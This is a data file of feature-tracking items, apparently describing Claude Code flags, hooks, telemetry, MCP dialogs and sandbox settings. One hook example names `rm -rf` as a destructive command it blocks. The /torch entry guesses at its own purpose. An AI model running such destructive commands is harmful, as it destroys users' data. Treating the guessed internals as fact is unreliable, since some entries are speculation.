items.title: CCR auto-connect — auto-start CCR on session launch via GrowthBook gate
items.summary: CC (feature-gated `CCR_AUTO_CONNECT`) checks the `tengu_cobalt_harbor` GrowthBook feature flag at startup and auto-enables CCR if true. Users don't need to manually run `--remote-control`; the session connects automatically when the flag is on.
items.done: With `CCR_AUTO_CONNECT` and the GrowthBook flag on, opening a new CC session automatically initiates CCR. No manual flag needed.

items.title: Remote setup wizard — `web` command for guided CCR onboarding
items.summary: CC (feature-gated `CCR_REMOTE_SETUP`) adds a `web` command (aliased to `remote-setup`) that walks through the CCR setup flow: auth, tunnel config, and connection verification. Lowerers the barrier for first-time CCR users.
items.done: Running `claude web` launches an interactive wizard that sets up the CCR tunnel and verifies the connection to claude.ai.

items.title: File persistence — BYOC session file state snapshot between turns
items.summary: CC (feature-gated `FILE_PERSISTENCE`) captures file access timestamps at the start of each turn and calls `executeFilePersistence` after the turn completes. Enabled only in BYOC environments with an ingress auth token. Allows CC sessions running in cloud environments to checkpoint file state for recovery.
items.done: In a BYOC deployment, file access during a turn is snapshotted. If the session crashes, the next session can detect which files were modified.

items.title: Background settings upload — sync local settings to cloud on session start
items.summary: CC (feature-gated `UPLOAD_USER_SETTINGS`) calls `uploadUserSettingsInBackground()` at session start via the settings sync service. Complements `DOWNLOAD_USER_SETTINGS` (already tracked as CC-SETTINGS-SYNC). The upload direction keeps the cloud copy current when users modify local settings.
items.done: On session start with the flag on, local settings are uploaded in the background. Cloud settings stay in sync without user action.

items.title: Auto theme — dynamic OS-aware theme switching ('auto' option in theme settings)
items.summary: CC (feature-gated `AUTO_THEME`) adds an `auto` option to theme settings. The `ThemeProvider` subscribes to OS appearance changes and switches between light/dark automatically. Without the flag, only named themes (dark, light, etc.) are available.
items.done: Setting theme to 'auto' in `/config` makes CC follow the OS dark mode toggle in real time.

items.title: Agent memory snapshot — update dialog after custom agent sessions
items.summary: CC (feature-gated `AGENT_MEMORY_SNAPSHOT`) shows a `launchSnapshotUpdateDialog` after sessions using custom agents with `pendingSnapshotUpdate`. Lets the user review and approve memory updates the agent learned during the session before they're persisted to the agent definition.
items.done: After a custom agent session ends with new memory, a dialog asks to confirm the learned facts. Approved facts update the agent's memory file.

items.title: Streamlined JSON output — compact stream-json transformer via env flag
items.summary: CC (feature-gated `STREAMLINED_OUTPUT`) applies a `createStreamlinedTransformer()` to `stream-json` output when `CLAUDE_CODE_STREAMLINED_OUTPUT` env is set. Produces a more compact machine-readable format for programmatic consumers.
items.done: With `CLAUDE_CODE_STREAMLINED_OUTPUT=1`, the stream-json output is transformed into a streamlined format suitable for piping to downstream tools.

items.title: Slow operation logging — detect and log slow operations with Anthropic-specific hooks
items.summary: CC (feature-gated `SLOW_OPERATION_LOGGING`) switches the `slowOperations` module to use Anthropic-internal logging hooks instead of the external stub. Surfaces slow JSON stringify, file ops, and LLM calls with timing data to internal analytics.
items.done: With the flag on, operations taking >Xms are logged with timing and operation type. Slow LLM turns appear in analytics.

items.title: Enhanced telemetry beta — OTEL session tracing via OTEL_TRACES_EXPORTER
items.summary: CC (feature-gated `ENHANCED_TELEMETRY_BETA`) enables OpenTelemetry session tracing. Configure `CLAUDE_CODE_ENHANCED_TELEMETRY_BETA` or `ENABLE_ENHANCED_TELEMETRY_BETA` env to set the exporter (console, otlp, etc.). Spans cover session lifecycle, tool calls, and LLM turns.
items.done: With OTEL enabled, `OTEL_TRACES_EXPORTER=console` prints structured spans to stdout for every tool call and LLM turn.

items.title: Perfetto tracing — Chrome Perfetto-compatible performance trace export
items.summary: CC (feature-gated `PERFETTO_TRACING`) integrates with the Perfetto performance tracing system. When `PERFETTO_TRACING` is on and the env var is set, trace events are emitted in Perfetto format for load in `chrome://tracing` or the Perfetto UI.
items.done: With Perfetto tracing on, opening `chrome://tracing` and loading the exported file shows a waterfall of CC operations.

items.title: Memory shape telemetry — track memory recall patterns for analytics
items.summary: CC (feature-gated `MEMORY_SHAPE_TELEMETRY`) calls `logMemoryRecallShape` when memory files are read and when `findRelevantMemories` runs. Records how memory is structured (CLAUDE.md vs memdir, session vs global) for analytics.
items.done: Memory read events include a shape annotation (global/project/session). Recall patterns appear in internal analytics.

items.title: Native client attestation — cch= token in User-Agent for first-party auth
items.summary: CC (feature-gated `NATIVE_CLIENT_ATTESTATION`) appends `cch=00000;` to the User-Agent string. Used by the Anthropic API to verify that requests come from a legitimate CC binary (not a wrapper). Part of first-party request attestation.
items.done: With attestation enabled, API requests include `cch=00000;` in the User-Agent. The API accepts this as a verified CC client signal.

items.title: Coworker type analytics — CLAUDE_CODE_COWORKER_TYPE env logged to session metadata
items.summary: CC (feature-gated `COWORKER_TYPE_TELEMETRY`) reads `CLAUDE_CODE_COWORKER_TYPE` env and includes it as `coworker_type` in all analytics events. Allows Anthropic to distinguish IDE extension, CLI, automation, and other deployment contexts.
items.done: With `CLAUDE_CODE_COWORKER_TYPE=ide_extension`, analytics events include `coworker_type: 'ide_extension'`.

items.title: Anti-distillation beta header — prevent model distillation from CC sessions
items.summary: CC (feature-gated `ANTI_DISTILLATION_CC`) conditionally sends an anti-distillation beta header on API requests when `shouldIncludeFirstPartyOnlyBetas()` is true and the GrowthBook gate passes. Prevents CC conversation data from being used in distillation training pipelines.
items.done: With the flag on and the GrowthBook gate enabled, API requests include the anti-distillation beta header.

items.title: Compaction reminders — inject compaction_reminder attachment into context
items.summary: CC (feature-gated `COMPACTION_REMINDERS`) adds a `compaction_reminder` resolver to the context attachments pipeline. When included, the reminder attachment nudges the model to use compaction tools when context is getting large, without hard-coding the instruction into the system prompt.
items.done: When context approaches limits, a `compaction_reminder` attachment appears in the context, prompting the model to consider compaction.

items.title: Skill generator skill — built-in skill for creating new skills from description
items.summary: CC (feature-gated `RUN_SKILL_GENERATOR`) registers `registerRunSkillGeneratorSkill` as a bundled skill. Allows the agent to generate new skill definitions from a natural language description, bootstrapping the skill system by dogfooding it.
items.done: Using the skill generator skill with a description produces a new `.claude/skills/` file wired to the skill registry.

items.title: Claude API skill — built-in skill for building Claude API applications
items.summary: CC (feature-gated `BUILDING_CLAUDE_APPS`) registers `registerClaudeApiSkill` as a bundled skill. Guides the user through building applications using the Anthropic Claude API: model selection, streaming, tool use patterns. Targeted at Claude developer onboarding.
items.done: Invoking the Claude API skill presents a guided workflow for setting up an Anthropic API integration in the current project.

items.title: Message actions panel — shift+up keybinding to act on previous messages
items.summary: CC (feature-gated `MESSAGE_ACTIONS`) adds a `shift+up` keybinding mapped to `chat:messageActions` and a `MessageActions` context with `messageActions:prev/next` navigation. Enables a contextual action panel over previous messages: copy, retry, branch, etc.
items.done: Pressing shift+up over a previous message opens the actions panel with options to copy, retry from that point, or branch the conversation.

items.title: PowerShell auto-approve guidance — include PS guidance in yolo classifier prompt
items.summary: CC (feature-gated `POWERSHELL_AUTO_MODE`) includes PowerShell-specific guidance in the yolo (auto-approve) classifier prompt when not using an external shell. Also gates a permission flow shortcut for PowerShell commands when `shouldAvoidPermissionPrompts` is set.
items.done: In auto-approve mode on Windows with PowerShell, the classifier prompt includes PS-specific safety guidance and common allow-patterns.

items.title: Connector text blocks — render summarize-connector-text beta with streaming awareness
items.summary: CC (feature-gated `CONNECTOR_TEXT`) sends the `summarize-connector-text-2026-03-13` beta header and handles `isConnectorTextBlock` content blocks in the message stream. Connector text blocks carry tool-result summaries from the API, reducing visible context size.
items.done: With the beta on, lengthy tool result content is replaced by a connector text block in the assistant's reply. The UI renders it inline without showing the full result.

items.title: Shot distribution stats — track shots-per-session histogram in /stats
items.summary: CC (feature-gated `SHOT_STATS`) adds shot distribution tracking to the stats module. A `shotDistributionMap` counts how many turns (shots) each session used, de-duplicating subagents by parent session. The `/stats` command shows the distribution histogram.
items.done: Running `/stats` shows a shot distribution: e.g., '40% of sessions used 1-3 turns, 30% used 4-10 turns'. Subagent turns are attributed to the parent.

items.title: Hard fail mode — crash on logError calls for test harness reliability
items.summary: CC (feature-gated `HARD_FAIL`) adds `--hard-fail` CLI flag. When set, `logError` throws instead of silently logging, turning soft errors into crashes. Used in test harnesses to catch error conditions that would otherwise be swallowed.
items.done: Running `claude --hard-fail run 'task'` crashes with a stack trace on the first `logError` call, making error paths visible in CI.

items.title: OverflowTestTool — synthetic tool to test context overflow handling
items.summary: CC (feature-gated `OVERFLOW_TEST_TOOL`) registers `OverflowTestTool`, a tool whose sole purpose is to fill context with synthetic content to trigger overflow/compaction code paths. Used by the classifier decision module for testing.
items.done: With the tool enabled, calling it with a size parameter fills the context with N tokens of dummy content, triggering the overflow handler.

items.title: --dump-system-prompt — CLI flag to print the assembled system prompt and exit
items.summary: CC (feature-gated `DUMP_SYSTEM_PROMPT`) adds a `--dump-system-prompt` flag. Running CC with this flag assembles the full system prompt (including operator/user layers, tool descriptions, context attachments) and prints it to stdout without starting a session.
items.done: Running `claude --dump-system-prompt` prints the full 3-tier system prompt to stdout. Useful for debugging operator prompt injection.

items.title: Ablation baseline mode — single env var disables all advanced features for A/B testing
items.summary: CC (feature-gated `ABLATION_BASELINE`) reads `CLAUDE_CODE_ABLATION_BASELINE` and, if set, enables a bundle of env vars disabling advanced features: `CLAUDE_CODE_SIMPLE`, `DISABLE_THINKING`, `DISABLE_COMPACT`, `DISABLE_AUTO_COMPACT`, `DISABLE_AUTO_MEMORY`, `DISABLE_BACKGROUND_TASKS`. Used for controlled A/B tests against a baseline.
items.done: With `CLAUDE_CODE_ABLATION_BASELINE=1`, the session runs with thinking, compaction, memory, and background tasks all disabled for a clean baseline comparison.

items.title: Allow test versions — install and run 99.99.x CC versions for internal testing
items.summary: CC (feature-gated `ALLOW_TEST_VERSIONS`) unlocks installation of `99.99.x` version numbers, which are reserved for internal test builds. Without the flag, the native installer rejects these versions as unavailable. Requires a `gcloud auth print-access-token` for download.
items.done: With the flag on, `claude install 99.99.1` downloads an internal test build using gcloud credentials.

items.title: Self-hosted runner — dedicated entrypoint for running CC as a CI/CD runner
items.summary: CC (feature-gated `SELF_HOSTED_RUNNER`) adds a `self-hosted-runner` CLI entrypoint that bypasses the interactive REPL and enters a dedicated runner mode. Designed for running CC as an automated agent in CI/CD pipelines with job-queue polling.
items.done: Running `claude self-hosted-runner` starts a job-polling loop. Incoming jobs from the queue are executed as CC sessions and results posted back.

items.title: /torch command — internal performance benchmarking / flame graph tool
items.summary: CC (feature-gated `TORCH`) registers a `torch` command. Source not available in the reference but likely related to performance profiling (torch = tracing/flame). Grouped with Perfetto tracing and slow operation logging as internal observability tooling.
items.done: /torch runs a benchmark or profiling capture and outputs a report or flame graph.

items.title: Token count API — pre-compute context size before API call (Anthropic/Bedrock/Vertex)
items.summary: CC's `tokenEstimation.ts` provides `countTokensWithAPI()`, `countTokensViaHaikuFallback()`, and `countTokensWithBedrock()`. These allow pre-computing the token count of a conversation before sending to avoid context window overruns. Supports Anthropic API, AWS Bedrock, and Vertex AI backends. Used internally for context budget management and proactive compaction decisions.
items.done: Before sending a large conversation, CC calls countTokens to check if it fits. If it exceeds budget, compaction runs first. All three providers (Anthropic, Bedrock, Vertex) return token estimates.

items.title: IDE auto-connect dialog — prompt to enable/disable automatic IDE connection
items.summary: CC shows an `IdeAutoConnectDialog` when an IDE is detected, asking whether to enable automatic CCR connection. A corresponding `IdeDisableAutoConnectDialog` appears when disabling. Both gate on `shouldShowAutoConnectDialog()` / `shouldShowDisableAutoConnectDialog()`. Allows users to configure persistent IDE<->terminal connection without manual `--remote-control`.
items.done: When VS Code opens a file CC is editing, a dialog asks 'Enable auto-connect to IDE?' Choosing yes persists the preference; subsequent sessions auto-connect.

items.title: Idle return dialog — re-engagement prompt after session inactivity
items.summary: CC shows an `IdleReturnDialog` when the user returns to an idle session. Distinct from the away summary (CC-AWAY-SUMMARY), which generates a recap text — the idle return dialog is an interactive prompt offering to resume, start fresh, or see what happened while away.
items.done: After 30+ min idle, returning to the terminal shows a dialog with 'Resume session', 'Start fresh', and 'Show what happened' options.

items.title: Sandbox violation expanded view — detailed breakdown of blocked sandbox actions
items.summary: CC has a `SandboxViolationExpandedView` component that renders an expanded view of sandbox policy violations. When the kernel blocks an action in sandbox mode, the expanded view shows which policy was violated, the command attempted, and context for the decision.
items.done: When a sandboxed tool call is blocked, the TUI shows an expandable violation panel listing the blocked command, rule violated, and why it was stopped.

items.title: Package manager auto-updater — in-TUI update prompt via brew/npm/apt
items.summary: CC has a `PackageManagerAutoUpdater` component that checks for newer versions and, if available, prompts the user to update via their package manager (brew, npm, apt). Separate from the binary auto-updater — specifically for installs done through a package manager.
items.done: When CC is installed via brew and a newer version is available, the TUI shows 'Update available: run brew upgrade claude'. Clicking applies the update.

items.title: MCP server multiselect dialog — batch-enable project MCP servers
items.summary: CC shows a `MCPServerMultiselectDialog` when a project has multiple pending MCP servers in `.mcp.json`. Users can space-select which servers to enable before confirming. More efficient than approving servers one by one through `MCPServerApprovalDialog`.
items.done: Opening a project with 3 MCP servers shows a checklist dialog. Selecting 2 and pressing Enter enables those servers for the project.

items.title: Import MCP servers from Claude Desktop — one-click import of Claude Desktop MCP config
items.summary: CC has a `MCPServerDesktopImportDialog` that reads Claude Desktop's MCP server configuration and imports selected servers into the current CC project config. Eliminates re-entering MCP server details for users who already have them configured in Claude Desktop.
items.done: Running `claude mcp add --from-claude-desktop` or opening the dialog lists all servers from `~/Library/Application Support/Claude/claude_desktop_config.json`. Selecting them adds them to `.mcp.json`.

items.title: MCP project server approval — per-project approval dialog for .mcp.json servers
items.summary: CC auto-shows `MCPServerApprovalDialog` for project-scoped servers listed in `.mcp.json` when they haven't been approved yet. The `handleMcpjsonServerApprovals()` call in setup runs before the session starts, collecting approvals for all pending project servers.
items.done: When opening a project with `.mcp.json`, CC shows approval dialogs for unapproved servers before the session starts. Approvals are persisted per-project.

items.title: Shell history ghost text — inline completion from zsh/bash history in prompt input
items.summary: CC reads shell history (zsh/bash) and shows ghost text suffix completions in the prompt input. When the user types the start of a previously-run command, the matching completion appears as dimmed text that can be accepted with the right-arrow key. A 60s LRU cache prevents repeated disk reads.
items.done: Typing 'git push' in the prompt shows 'git push origin main' as grey ghost text if that's in shell history. Right arrow accepts.

items.title: File path completion — tab-autocomplete for directory and file paths in prompt
items.summary: CC has a `directoryCompletion.ts` module with LRU-cached directory listing that feeds path autocomplete in the prompt input. Typing `/` or `./` triggers path suggestions from the cwd. Completions appear in the `PromptInputFooterSuggestions` component.
items.done: Typing './src/' in the prompt shows a dropdown of files in that directory. Selecting one inserts the full path.

items.title: `/desktop` — download and launch the Claude desktop app from terminal
items.summary: CC has a `/desktop` command backed by `DesktopHandoff` component. It detects whether the desktop app is installed, prompts to download if not, and opens the active session in the desktop app once installed. States: checking → prompt-download → flushing → opening → success/error.
items.done: Running `/desktop` in the terminal detects or downloads the Claude desktop app and transfers the current session into it.

items.title: Desktop app upsell dialog — GrowthBook-gated prompt to try Claude Code Desktop
items.summary: CC shows a `DesktopUpsell` dialog (title: 'Try Claude Code Desktop') based on `tengu_desktop_upsell` GrowthBook config. Prompts terminal users to try the native desktop app. Logs `tengu_desktop_upsell_shown` analytics event.
items.done: When the GrowthBook flag is on, a dialog appears offering to download the desktop app. Analytics tracks conversion.

items.title: Remote Control first-run callout — onboarding dialog for CCR setup
items.summary: CC shows a `RemoteCallout` component (PermissionDialog titled 'Remote Control') as a first-time callout when CCR conditions are met. Guides users through enabling remote control for the first time. Tracks whether the user has seen it.
items.done: First time a CCR-eligible session runs, a dialog explains what Remote Control is and asks to enable it.

items.title: `/goal` — set a completion condition; agent works until it's met
items.summary: CC (v2.1.139) adds `/goal` to set a completion condition for the session. Claude works autonomously across turns until the condition is satisfied. Works in interactive and headless sessions. Core to persistent autonomous agent loops.
items.done: Running `/goal done when tests pass` causes the agent to keep iterating until `npm test` passes without being re-prompted.

items.title: `--safe-mode` / `CLAUDE_CODE_SAFE_MODE` — start with all customizations disabled
items.summary: CC (v2.1.169) adds `--safe-mode` flag and `CLAUDE_CODE_SAFE_MODE` env. Disables CLAUDE.md, plugins, skills, hooks, MCP servers, custom agents, workflows, keybindings, and output styles — useful for troubleshooting broken configs. Admin-managed (policy) settings and auth still apply.
items.done: Running `claude --safe-mode` starts a clean session with zero customizations. A startup banner confirms safe mode is active.

items.title: `/cd` — change working directory mid-session without breaking prompt cache
items.summary: CC (v2.1.169) adds `/cd <path>` to move the active session to a new directory. Unlike shell `cd`, it updates CC's root context and tool paths without invalidating the prompt cache, preserving accumulated context.
items.done: Running `/cd ~/other-project` mid-session switches tool resolution to the new root. The prompt cache remains intact.

items.title: Hook `additionalContext` — hooks return context to keep the turn going
items.summary: CC (v2.1.163) adds `hookSpecificOutput.additionalContext` to Stop and SubagentStop hooks. Instead of ending the turn, the hook can return feedback text that Claude receives as context and continues working. Enables hook-driven agent feedback loops.
items.done: A Stop hook returns `{additionalContext: 'Tests failed — retry with fix X'}`. Claude reads this and continues the turn without re-prompting.

items.title: `MessageDisplay` hook event — transform or hide assistant messages before rendering
items.summary: CC (v2.1.152) adds a `MessageDisplay` hook event that fires before each assistant message is shown. Hooks can rewrite or suppress the text — useful for operators that want to strip internal reasoning, add context, or route messages to external systems.
items.done: A MessageDisplay hook strips <thinking> blocks from displayed output. The transcript shows clean responses; raw content still reaches downstream tools.

items.title: `PermissionDenied` hook — fire on auto-mode classifier denials with retry option
items.summary: CC (v2.1.89) adds a `PermissionDenied` hook that fires after auto-mode classifier denials. Returning `{retry: true}` tells Claude to try an alternative approach instead of stopping. Enables operator-controlled recovery from permission blocks.
items.done: A PermissionDenied hook logs the denied action and returns `{retry: true}`. Claude rewrites the command to avoid the denied pattern.

items.title: Hook exec form — `args: string[]` spawns hook directly without a shell
items.summary: CC (v2.1.139) adds `args: string[]` to hook config (exec form). The hook binary is spawned directly without a shell, so path placeholders don't need escaping and the command can't be injection-bypassed via shell metacharacters.
items.done: A hook configured as `{command: '/usr/bin/notify', args: ['--title', '$TOOL_NAME']}` spawns directly. No shell wrapping, no injection risk.

items.title: Hook `continueOnBlock` — feed PostToolUse rejection reason back to model
items.summary: CC (v2.1.139) adds `continueOnBlock: true` to `PostToolUse` hook config. When the hook blocks a tool, instead of hard-stopping, the rejection reason is fed back to Claude as a tool result so it can adapt its approach.
items.done: A PostToolUse hook blocks `rm -rf` and sets `continueOnBlock: true`. Claude receives 'destructive rm blocked' as the tool result and chooses a safer alternative.

items.title: `/reload-skills` — re-scan skill directories without restarting the session
items.summary: CC (v2.1.152) adds `/reload-skills` to re-scan `~/.claude/skills/` and plugin skill dirs in-session. A `SessionStart` hook can also return `reloadSkills: true` to auto-reload after installing new skills.
items.done: After a hook installs a new skill, `/reload-skills` makes it available immediately. No session restart needed.

items.title: `/tui` — toggle fullscreen flicker-free rendering mode in the same session
items.summary: CC (v2.1.110) adds `/tui fullscreen` to switch to the alternate-screen renderer mid-session without losing context. The fullscreen renderer virtualizes scrollback for lower memory usage, enables mouse support, and auto-copies on selection.
items.done: Running `/tui fullscreen` in the TUI switches to the flicker-free renderer. The session continues; all prior context is preserved.

items.title: `CLAUDE_CODE_NO_FLICKER=1` — opt into flicker-free alt-screen rendering globally
items.summary: CC (v2.1.89) adds `CLAUDE_CODE_NO_FLICKER=1` to start every session in the fullscreen alt-screen renderer. Reduces terminal flicker, enables virtualized scrollback, and improves rendering performance on slow terminals.
items.done: With `CLAUDE_CODE_NO_FLICKER=1` in `.env`, all CC sessions start in fullscreen mode. `/tui` can still toggle back.
items.notes: Alt-screen enter/leave in launch.tsx; VANTA_NO_FLICKER=1 + CLAUDE_CODE_NO_FLICKER=1 both accepted. Documented in .env.example.

items.title: Vim visual mode — `v`/`V` selection with operators in the prompt input
items.summary: CC (v2.1.118) adds vim visual mode (`v` char-select, `V` line-select) with operators (d/y/c) and visual feedback in the prompt input. Extends the existing vim normal mode.
items.done: In vim mode, pressing `v` starts character selection. `d` deletes the selection; `y` yanks to register.

items.title: `requiredMinimumVersion` / `requiredMaximumVersion` — managed settings version enforcement
items.summary: CC (v2.1.163) adds `requiredMinimumVersion` and `requiredMaximumVersion` managed settings. CC refuses to start if the running version is outside the allowed range and directs users to the approved version. Useful for enterprise operators pinning a release.
items.done: An org sets `requiredMinimumVersion: '2.1.163'`. Users on older versions see an error pointing them to update before proceeding.

items.title: Plugin background monitors — auto-armed monitoring scripts per session
items.summary: CC (v2.1.105) adds a `monitors` key to plugin manifests (under `experimental`). Monitor scripts are auto-armed at session start or on demand, running in the background and emitting events the agent can react to.
items.done: A plugin's `monitors` section starts a filesystem watcher. When a watched file changes, the agent receives an event and acts without a user prompt.

items.title: Plugin `bin/` executables — plugins ship binaries invocable from Bash tool
items.summary: CC (v2.1.91) allows plugins to ship executables under `bin/`. These are added to the PATH for Bash tool subprocesses, so agents can call plugin-provided tools as bare commands without absolute paths.
items.done: A plugin ships `bin/my-tool`. The agent calls `my-tool --flag` in Bash without knowing the install path.

items.title: `claude ultrareview` — run cloud multi-agent code review non-interactively from CI
items.summary: CC (v2.1.120) adds `claude ultrareview [target]` as a non-interactive CLI subcommand. Runs the multi-agent parallel code review that `/ultrareview` triggers, but from CI scripts or cron — prints findings to stdout in a parseable format.
items.done: Running `claude ultrareview` in CI prints structured code review findings. Can target a branch name or PR number.

items.title: MCP `alwaysLoad` option — skip tool-search deferral for trusted servers
items.summary: CC (v2.1.121) adds `alwaysLoad: true` to MCP server config. All tools from that server are loaded immediately at startup instead of waiting for a tool-search lookup. Useful for MCP servers with a small, always-relevant tool set.
items.done: A high-frequency MCP server configured with `alwaysLoad: true` has its tools available from message 1, without a ToolSearch call first.

items.title: `ENABLE_PROMPT_CACHING_1H` — opt into 1-hour prompt cache TTL
items.summary: CC (v2.1.108) adds `ENABLE_PROMPT_CACHING_1H` to opt into a 1-hour prompt cache TTL (vs the default 5 minutes) on API key, Bedrock, Vertex, and Foundry. Dramatically reduces cost for long-running sessions.
items.done: With `ENABLE_PROMPT_CACHING_1H=1`, cache hits persist for 1 hour. A 2-hour session with a large system prompt sees >80% cache hit rate.

items.title: Bedrock interactive setup wizard — guided AWS credentials and region config
items.summary: CC (v2.1.92) adds an interactive Bedrock setup wizard accessible from the login screen when selecting '3rd-party platform'. Guides through AWS credentials, region, model ARN, and connection verification.
items.done: Selecting 'Amazon Bedrock' from `/login` launches a wizard that collects AWS creds, verifies connectivity, and writes the config — no manual env vars.

items.title: Vertex AI interactive setup wizard — guided GCP project and auth config
items.summary: CC (v2.1.98) adds an interactive Vertex AI setup wizard accessible from the login screen. Guides through GCP project ID, region, service account, and ADC setup.
items.done: Selecting 'Google Vertex AI' from `/login` launches a wizard that walks through GCP auth, project, region, and model selection.

items.title: `CLAUDE_CODE_PERFORCE_MODE` — fail on read-only files with `p4 edit` hint
items.summary: CC (v2.1.98) adds `CLAUDE_CODE_PERFORCE_MODE`. When set, Edit/Write/NotebookEdit fail on read-only files with a `p4 edit` hint instead of silently failing. For Perforce workspaces where files must be checked out before editing.
items.done: With Perforce mode on, attempting to edit a locked file returns 'Run `p4 edit` first'. The agent calls `p4 edit` then retries.

items.title: `worktree.baseRef` — choose `fresh` or `head` as the worktree branch base
items.summary: CC (v2.1.133) adds `worktree.baseRef` setting (`'fresh'` | `'head'`). `fresh` creates worktrees from the remote default branch (clean slate); `head` creates from local HEAD (includes unpushed commits). Controls `--worktree`, `EnterWorktree`, and agent isolation.
items.done: Setting `worktree.baseRef: 'head'` makes all new worktrees branch from the current local HEAD.

items.title: `worktree.bgIsolation: "none"` — let background agents edit working copy directly
items.summary: CC (v2.1.143) adds `worktree.bgIsolation: 'none'` setting. When set, background agents can edit the working copy directly without being forced into a worktree via `EnterWorktree`. For workflows where worktree isolation adds friction.
items.done: With `bgIsolation: 'none'`, a background agent edits files in the main checkout without branching first.

items.title: `EnterWorktree` path param — switch into an existing worktree mid-session
items.summary: CC (v2.1.105) adds a `path` parameter to `EnterWorktree`. Instead of always creating a new worktree, the tool can switch into an existing one — useful when multiple agents share worktrees or when resuming work in a pre-existing worktree.
items.done: Calling `EnterWorktree({path: '../my-feature-worktree'})` switches the session's root to that existing worktree without creating a new branch.

items.title: `/code-review` — renamed from `/simplify`; runs correctness review at chosen effort
items.summary: CC (v2.1.147) renames `/simplify` to `/code-review`. It now reports correctness bugs at a chosen effort level (e.g., `/code-review high`) rather than just simplifying. The old `/simplify` name still works as an alias.
items.done: Running `/code-review high` on the current diff reports correctness bugs, logic errors, and potential regressions at high effort.

items.title: `DISABLE_UPDATES` — completely block all update paths including manual `claude update`
items.summary: CC (v2.1.118) adds `DISABLE_UPDATES` env var to block all update mechanisms — including manual `claude update` — stricter than the existing update-disable settings. Useful for locked-down CI environments or enterprise deployments pinned to a specific version.
items.done: With `DISABLE_UPDATES=1`, running `claude update` returns an error. Auto-updater checks are also skipped at startup.

items.title: `sandbox.network.deniedDomains` — block specific domains under a broader allowlist
items.summary: CC (v2.1.113) adds `sandbox.network.deniedDomains` to deny specific domains even when a broader `allowedDomains` wildcard would otherwise permit them. Enables allowlist + denylist layering: allow `*.api.com` but deny `internal.api.com`.
items.done: With `allowedDomains: ['*.api.com']` and `deniedDomains: ['internal.api.com']`, requests to `internal.api.com` are blocked.

items.title: Ultracode trigger keyword — `ultracode` in prompt launches dynamic workflow
items.summary: CC (v2.1.160) renames the dynamic-workflow prompt keyword from `workflow` to `ultracode`. Typing `ultracode` in a prompt triggers the multi-agent workflow orchestration mode. The old `workflow` keyword no longer triggers a run; asking in natural language still works. A setting in `/config` can disable the keyword trigger.
items.done: Typing 'ultracode refactor this module' in the prompt triggers the workflow engine. The old 'workflow' keyword is inert.

items.title: `/bg` flag preservation — backgrounded sessions keep all startup flags
items.summary: CC (v2.1.143-144) ensures `/bg` and `←`-detach preserve all startup flags: `--mcp-config`, `--settings`, `--add-dir`, `--plugin-dir`, `--strict-mcp-config`, `--fallback-model`, `--allow-dangerously-skip-permissions`. Also (v2.1.153): `/bg` while responding continues the active response in the background session instead of dropping it.
items.done: Backgrounding a session with `--mcp-config custom.json` spawns a worker with the same MCP config. An in-progress response continues streaming in the background.

items.title: `/bg` while responding — active response continues in background, not dropped
items.summary: CC (v2.1.153) changes `/bg` behavior during an active response. Instead of dropping the in-progress output, the response continues streaming in the background session. Users can re-attach with `claude agents` to see the result.
items.done: Pressing `/bg` while Claude is responding transfers the live stream to the background. Attaching later shows the completed response.

items.title: Hook `sessionTitle` output — `UserPromptSubmit` hooks can set the session title
items.summary: CC (v2.1.94) adds `hookSpecificOutput.sessionTitle` to `UserPromptSubmit` hook output. A hook can return a title string that becomes the session's name. Useful for auto-titling sessions based on the first prompt's content or intent.
items.done: A UserPromptSubmit hook returns `{sessionTitle: 'Fix auth bug #1234'}`. The session is named that without a separate `/rename`.

items.title: Hook MCP tool invocation — `type: 'mcp_tool'` in hook config calls MCP tools directly
items.summary: CC (v2.1.118) allows hooks to invoke MCP tools directly via `type: 'mcp_tool'` in hook config. Hooks no longer need a shell command to call an MCP server — they reference the tool by server name and tool name. Enables tight hook↔MCP integration without subprocess overhead.
items.done: A PostToolUse hook with `type: 'mcp_tool', server: 'notify', tool: 'send_notification'` triggers the MCP notification tool directly.

items.title: `/focus` command — separate focus view toggle (split from Ctrl+O)
items.summary: CC (v2.1.110) adds `/focus` as a dedicated command to toggle focus view (compact prompt + one-line tool summary + final response only). `Ctrl+O` now only toggles between normal and verbose transcript; `/focus` is the focus-view entry point.
items.done: Running `/focus` switches to a minimal view showing only the prompt, tool summary line, and final response. `/focus` again returns to normal.

items.title: `/undo` as alias for `/rewind` — consistent session rollback UX
items.summary: CC (v2.1.108) makes `/undo` an alias for `/rewind`, so the more intuitive command name works. Both now open the rewind checkpoint picker.
items.done: Typing `/undo` opens the same rewind menu as `/rewind`. No behavioral difference — purely a discoverability improvement.

items.title: `/usage` — merged `/cost` and `/stats` into tabbed view
items.summary: CC (v2.1.118) merges `/cost` and `/stats` into `/usage` with tabs. Both `/cost` and `/stats` still work as shortcuts that open the relevant tab. Includes per-model and cache-hit breakdown for subscription users.
items.done: Running `/usage` opens a tabbed panel with Cost and Stats tabs. `/cost` and `/stats` jump directly to their respective tab.

items.title: grep satisfies read-before-edit — single-file grep counts as a read for Edit tool
items.summary: CC (v2.1.160) makes single-file `grep`/`egrep`/`fgrep` commands satisfy the read-before-edit check. Previously, `head`/`tail` could count; now grep does too. Avoids an extra Read call when the agent has already grepped the file.
items.done: After `grep 'pattern' src/foo.ts`, the Edit tool can modify `src/foo.ts` without a separate Read call.

items.title: Write tool IDE diff feedback — model notified when you edit proposed content before accepting
items.summary: CC (v2.1.110) makes the Write tool inform the model when the user edits the proposed content in the IDE diff view before accepting. The model receives the actual accepted content, not the originally proposed version, closing a feedback gap.
items.done: When Claude proposes a file change and you edit it in the diff panel before accepting, Claude's next turn reflects your edits — it knows what you actually accepted.

items.title: `/less-permission-prompts` — scan transcript and propose read-only allow rules
items.summary: CC (v2.1.111) adds a `/less-permission-prompts` skill that scans session transcripts for repeated read-only Bash and MCP tool calls and proposes a prioritized allow list. Reduces friction from over-prompted read operations.
items.done: Running `/less-permission-prompts` analyzes the session transcript and suggests `Bash(git status:*)` and `Bash(cat:*)` as safe auto-allows.

items.title: Status line GitHub PR info — repo and PR data in status line JSON input
items.summary: CC (v2.1.145) adds GitHub repo name and PR number/title to the status line JSON input when detected from the git remote and current branch. Status line scripts can now show the active PR inline.
items.done: A status line script reads `git.repo` and `git.pr` from the JSON input and displays `owner/repo#42` next to the branch name.
